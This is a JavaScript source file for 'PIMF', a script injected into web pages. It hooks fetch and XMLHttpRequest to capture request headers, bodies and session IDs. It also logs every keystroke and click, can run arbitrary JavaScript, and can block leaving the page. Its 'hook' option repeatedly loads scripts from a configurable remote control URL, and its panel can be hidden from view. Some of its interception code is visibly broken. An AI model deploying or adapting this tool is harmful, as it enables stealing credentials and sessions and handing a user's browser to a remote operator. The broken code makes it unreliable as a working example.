/*
                            P I M F

            Page Interception and Manipulation Framework
        ----------------------------------------------------


    (c) PhiXi, 2026 (github.com/phi-xi)

    License: opensource.org/license/mit

*/

const Q = ( function(){

    const
        api_name = "PIMF",
        version  = "1.49",
        config   = {
            gui:null,
            txt:null,
            url: {
                hook:null,
                ping:null
            }
        };

    const
        query_session_id = [
            "session_id","session-id",
            "SESS_ID","SESSION_ID",
            "sid","SID","SESSION-ID",
            "sessionID","sessionId",
            "sessid","sessId","sesid",
            "sessID","sesID","sesId", ];


    function request( url, method, headers, body=false ){
        return new Promise( async ( resolve, reject ) => {
            try {
                let result = false,
                req = {
                    method:     method,
                    headers:    headers
                };
                if ( body ){
                    req.body = body;
                }
                const response = await fetch( url, req );
                if ( !response.ok ){
                    throw new Error( `Response status: ${response.status}` );
                }
                const response_clone = response.clone();
                try {
                    result = await response.json();
                } catch( e ){
                    result = await response_clone.text();
                }
                resolve( result );
            } catch ( error ){
                reject( error.message );
            }
        } );
    }
    function _msg( txt, add_button ){
        let m = mk( "div",
                    "q-msg",
                    {
                        style: "font-family:"
                                + this
                                + ";"
                    },
                    txt + "<br><br>" );
        if ( add_button ){
            let b = get_button( "OK", function(){
                document.body.removeChild( m );
            } );
            b.style.marginLeft = "45%";
            m.appendChild( b );
        } else {
            m.style.textAlign = "center";
        }
        document.body.appendChild( m );
        return m;
    }
    let msg = _msg.bind( "Ubuntu" );
    function load_script( url ){
        let e = mk( "script", false, {
            src:  url,
            type: "text/javascript"
        } );
        document.body.appendChild( e );
        setTimeout( ()=>{
            document.body.removeChild( e );
        }, 3000 );
    }
    function execute( src ){
        document.body.appendChild(
            mk( "script", "", {}, src ) );
    }
    function mk( ename, cname, attr={}, text="" ){
        let e = document.createElement( ename );
        if ( cname ){
            e.className = cname;
        }
        if ( text != "" ){
            e.innerHTML = text;
        }
        for ( let aname in attr ){
            e.setAttribute( aname,
                            attr[ aname ] );
        }
        return e;
    }
    function get_button( name, callback ){
        let b = mk( "button", "q-btn" );
        b.innerHTML = name;
        b.addEventListener( "click", callback );
        return b;
    }
    function get_checkbox( name, callback ){
        let wrap     = mk( "div", "q-checkbox-wrap q-inline" ),
            label    = mk( "label",
                            "q-label q-inline",
                            {
                                for: name
                            } ),
            checkbox = mk( "input",
                            "q-checkbox q-inline",
                            {
                                name: name,
                                type: "checkbox"
                            } );
        label.innerHTML = name;
        wrap.appendChild( checkbox );
        wrap.appendChild( label );
        checkbox.addEventListener( "change", callback );
        return wrap;
    }
    function unix_time_now(){
        return Math.round( new Date().getTime() / 1000 );
    }
    function add_to_set_array( element, array ){
        if ( array.includes( element ) ) return false;
        array.push( element );
        return true;
    }
    function recursive_search_by_keys( needles, data, callback ){
        for ( let key in data ){
            let p = data[ key ];
            if ( typeof( p ) == "object" ){
                if ( key.toLowerCase() == "session" ){
                    if ( typeof( p.id ) != "undefined"
                        && typeof( p.id ) != "object" ){
                            callback( p.id );
                            return; }
                }
                recursive_search_by_keys( needles, p, callback );
            }
            if ( needles.includes( key ) ){
                callback( p );
                return;
            }
        }
    }
    function find_sid( body_txt ){
        let data = null;
        try {
            data = JSON.parse( body_txt );
        } catch(e){
            data = new URLSearchParams( body_txt );
        }
        recursive_search_by_keys( query_session_id, data, (sid)=>{
            if ( typeof( sid ) == "string" ){
                add_to_set_array( "Session ID: " + sid.toString(),
                                  Q.data.log.credentials.session_ids );
                refresh();
            }
        } );
    }
    function find_hidden_fields(){}

    function _log_click( e ){
        Q.data.log.events.clicks.push( {
            time:   unix_time_now() - init_time,
            target: e.target.nodeName,
            text:   e.target.textContent
        } );
        refresh();
    }
    function _log_keypress( e ){
        let t = unix_time_now() - init_time,
            k = e.key;
            if ( e.key == "Enter" ) k = "ENTER";
            Q.data.log.events.keys.push( {
                time:   unix_time_now(),
                key:    k,
                target: e.target.nodeName
            } );
        refresh();
    }
    function _checkbox_transparent(){
        details.style.opacity =
            this.checked ? opacity : 1;
    }
    function _checkbox_monospace(){
        let css = ".q-bar,.q-box,.q-btn,.q-input,.q-checkbox,.q-textarea,.q-msg{font-family:monospace;}",
            style = Q.mk( "style", "", {}, css );
        document.body.appendChild( style );
        this.disabled = true;
    }
    function _checkbox_interept(){
        if ( !this.checked ){
            Q.intercept.stop();
        } else {
            Q.intercept.start( (type, url, opts)=>{} );
        }
    }
    function _checkbox_lock(){
        if ( !this.checked ){
            window.onbeforeunload = null;
        } else {
            window.onbeforeunload = (e)=>{
                e.preventDefault();
            };
        }
    }
    function _checkbox_select(){
        if ( !this.checked ){
            if ( selector === null ) return;
            window.removeEventListener( "click", selector );
            selector = null;
        } else {
            selector = window.addEventListener( "click", (e)=>{
                const t = e.target;
                t.style.border = "solid 2px var(--orange-lite)";
                setTimeout( ()=>{
                    t.style.border = "";
                }, 500 );
            } );
        }
    }
    function _checkbox_log(){
        window.addEventListener( "click",   _log_click );
        window.addEventListener( "keydown", _log_keypress );
        this.disabled = true;
    }
    function _checkbox_hook(){
        if ( !this.checked ){
            if ( rc !== null ){
                clearInterval( rc );
                rc = null;
            }
        } else {
            if ( rc === null ){
                rc = setInterval( ()=>{
                    load_script( url_rctrl + "?"
                        + unix_time_now().toString() );
                }, sync_rate );
            }
        }
    }
    function _button_visibility(){
        Q.gui.hide();
        Q.gui.dialog
            .toast( "Move mouse to top left corner to show PIMF" );
    }
    function _button_exit(){
        Q.exit();
    }
    function _on_inject_complete(){
        let d = 1;
        Q.gui.dialog.toast( "Injection complete", d );
        setTimeout ( ()=>{
            load_script( url_test );
        }, 1000*d );
    }
    function _on_active_corner( e ){
        if ( e.clientX + e.clientY < 15 ){
            Q.gui.show();
        }
    }
    function _on_page_click( e ){
        let t = e.target,
            n = t.nodeName;
        if ( [ "INPUT","TEXTAREA" ].includes( n ) ){
            t.value   = textblock;
            textblock = null;
        }
    }
    function _on_cli_input( e ){
        if ( e.keyCode == 13 ){
            const cmd = input_cli.value.split( " " );
            if ( ["GET","POST"].includes( cmd[0] ) ){
                request( cmd[1], cmd[0], JSON.parse(cmd[2]), cmd[3] )
                .then(
                    (r)=>{
                        input_cli.value = "";
                        let s = _msg.bind( "monospace" ),
                      m = r.replace( /\&/g, "&amp;" )
                      .replace( /\</g, "&lt;" )
                      .replace( /\>/g, "&gt;" );
                      s( m, true ); },
                      (r)=>{
                          s( cmd[0]
                          + "  request to  "
                          + cmd[1]
                          + "  failed with status  "
                          + r.split( ":" )[1] );
                      } );
            } else {
                execute( input_cli.value );
            }
        }
    }

    function init(){
        style.innerHTML = css;
        document.body.appendChild( link );
        document.body.appendChild( style );
        let checkboxes = [
            get_checkbox( "transparent", _checkbox_transparent ),
            get_checkbox( "monospace",   _checkbox_monospace ),
            get_checkbox( "intercept",   _checkbox_interept ),
            get_checkbox( "lock",        _checkbox_lock ),
            get_checkbox( "select",      _checkbox_select ),
            get_checkbox( "log",         _checkbox_log ),
            get_checkbox( "hook",        _checkbox_hook )
        ];
        let bottons = [
            get_button( "Hide", _button_visibility ),
            get_button( "Exit", _button_exit )
        ];
        details.style.opacity = 1;
        summary.innerHTML = title;
        for ( let i=0; i < checkboxes.length; i++ )
            summary.appendChild( checkboxes[ i ] );
        for ( let i=0; i < bottons.length; i++ )
            summary.appendChild( bottons[ i ] );
        details.appendChild( summary );
        details.appendChild( box_cli );
        box_cli.appendChild( input_cli );
        details.appendChild( box_post );
        details.appendChild( box_get );
        details.appendChild( box_header );
        details.appendChild( box_info );
        details.appendChild( box_keylog );
        document.body.appendChild( details );
        box_cli.style.width     = "90vw";
        box_cli.style.height    = "10vh";
        summary.lastChild.style.backgroundColor = "var(--orange)";
        summary.lastChild.style.borderColor = "var(--orange-lite)";
        setTimeout ( _on_inject_complete, 10 );
        window.addEventListener( "mousemove",   _on_active_corner );
        window.addEventListener( "click",       _on_page_click );
        input_cli.addEventListener( "keydown",  _on_cli_input );
    }
    function refresh(){
        box_header.innerHTML = Q.data.log.headers.join("<br>");
        box_info.innerHTML   = Q.data.log.credentials.session_ids.join("<br>");
        let k = Q.data.log.events.keys,
            t = "";
        for ( let i=0; i < k.length; i++ ){
            t += k[ i ].key + ".";
        }
        box_keylog.innerHTML = t;
    }

    const
        original_fetch_constructor    = fetch.constructor.prototype,
        original_xhr_open             = XMLHttpRequest
                                            .prototype.open,
        original_xhr_setRequestHeader = XMLHttpRequest
                                            .prototype.setRequestHeader,
        original_xhr_send             = XMLHttpRequest.prototype.send,
        url_font  = "https://fonts.googleapis.com/css?family=Ubuntu",
        tsep      = " | ",
        title     = "<span style='color:var(--green-lite);'>&Phi;&Xi;"
                        + tsep
                        + api_name
                        + "<span style='color:var(--green);font-size:0.6em;'>"
                        + tsep
                        + version
                        + "</span></span>",
        sync_rate = 5 * 1000,
        opacity   = 0.7,
        init_time = unix_time_now(),
        style     = mk( "style",    false ),
        summary   = mk( "summary",  "q-bar-title" ),
        details   = mk( "details",  "q-bar" ),
        bar_title = mk( "div",      "q-bar-title" ),
        box_cli   = mk( "div",      "q-box q-cli q-inline" ),
        input_cli = mk( "input",    "q-box q-input", {
            placeholder: "Type HTTP command and execute with ENTER. Syntax: "
                            + "<GET|POST> <url> <header_JSON> <body>"
        } ),
        box_get   = mk( "div",      "q-box q-inline" ),
        box_post  = mk( "div",      "q-box q-inline" ),
        box_header= mk( "div",      "q-box q-inline q-box-small" ),
        box_info  = mk( "div",      "q-box q-inline q-box-small" ),
        box_keylog= mk( "div",      "q-box q-inline q-box-small" ),
        link      = mk( "link",     "",
                                    {
                                        rel: "stylesheet",
                                        href: url_font } );
        const css = "";


    let url_rctrl = config.url.hook,
        url_test  = config.url.ping,
        locker      = null,
        rc          = null,
        proc_id     = null,
        selector    = null,
        textblock   = null;


    init();


    return {

        data: {
            log: {
                events: {
                    clicks: [],
                    keys: []
                },
                credentials: {
                    session_ids: [],
                    tokens: []
                },
                headers: []
            }
        },

        gui: {
            show: function(){
                details.style.display = "";
            },
            hide: function(){
                details.style.display = "none";
            },
            dialog: {
                message: function( txt ){
                    msg( txt, true );
                },
                msg: function( txt ){
                    msg( txt, true );
                },
                toast: function( txt, duration=3 ){
                    let m = msg( txt, false );
                    setTimeout( ()=>{
                        document.body.removeChild( m );
                    }, 1000 * duration );
                }
            },
            warn: function( txt ){}
        },

        hook: {
            get_proc_id: function(){
                return proc_id;
            },
            set_proc_id: function( pid ){
                proc_id = pid;
            }
        },

        execute: function( src ){
            execute( src );
        },
        load_script: function( url ){
            load_script( url );
        },

    // TODO intercept form requests
        intercept: {
            start: function( callback, block_request=false ){
                fetch.constructor.prototype = function( url, options ){
                    let u = url.split( "?" );
                    if ( u.length > 1 ) find_sid( url[1] );
                    callback( "FETCH", url, options );
                    let b = options.method == "GET" ? box_get : box_post;
                    b.innerHTML += "<br><div style='color:var(--cyan);font-weight:bold;'>"
                                        + options.method.toUpperCase()
                                        + "<br>"
                                        + JSON.stringify( options )
                                        + "</div> "
                                        + url;
                    if ( !block_request ){
                        original_fetch_constructor.apply( this, arguments );
                    }
                    add_to_set_array( JSON.stringify( options.headers ),
                                      Q.data.log.headers );
                    refresh();
                };
                XMLHttpRequest.prototype.open = function( method, url ){
                    callback( "XHR", url, method );
                    let u = url.split( "?" ),
                        b = method == "GET" ? box_get : box_post;
                    b.innerHTML += "<br><div style='color:var(--cyan);font-weight:bold;'>"
                                        + method.toUpperCase()
                                        + "</div> "
                                        + url;
                    if ( u.length > 1 ) find_sid( url[1] );
                    original_xhr_open.apply( this, arguments );
                };
                XMLHttpRequest.prototype.setRequestHeader = function( header, value ){
                    add_to_set_array( header + ": " + value,
                                      Q.data.log.headers );
                    original_xhr_setRequestHeader.apply( this, arguments );
                    refresh();
                };
                XMLHttpRequest.prototype.send = function( body ){
                    if ( body != null ){
                        box_post.innerHTML += "<br><div style='color:var(--white);'>"
                            + body
                            + "</div> ";
                    }
                    find_sid( body );
                    original_xhr_open.apply( this, arguments );
                };
            },
            stop: function(){
                fetch.constructor.prototype       = original_fetch_constructor;
                XMLHttpRequest.prototype.open     = original_xhr_open;
                XMLHttpRequest.prototype.send     = original_xhr_send;
                XMLHttpRequest.prototype
                                .setRequestHeader = original_xhr_setRequestHeader;
            }
        },

        request: function( url, method, headers, body=false ){
            return request( url, method, headers, body );
        },

        send: function( url, headers={} ){
            return {
                get: function(){
                    return request( url, "GET", headers, false );
                },
                post: function( data ){
                    return request( url, "POST", headers, data );
                }
            };
        },

        r: function( n ){
            return document.getElementById( n )
                || document.getElementsByClassName( n )
                || document.getElementsByTagName( n );
        },
        mk: function( ename, cname, attr={}, text="" ){
            return mk( ename, cname, attr, text );
        },

        aux: {
            extract_video: function(){
                const url = document.getElementsByClassName("fp-engine")[0].getAttribute("src");
                document.write("<a id='q-link' href='" + url + "' target='_blank'>Download video</a>");
                setTimeout( ()=>{
                    document.getElementById('q-link').click();
                },1000 );
            },
            delete_element: function(){
                //TODO
            }
        },

        exit: function(){
            document.body.removeChild( details );
        }

    };

} )();
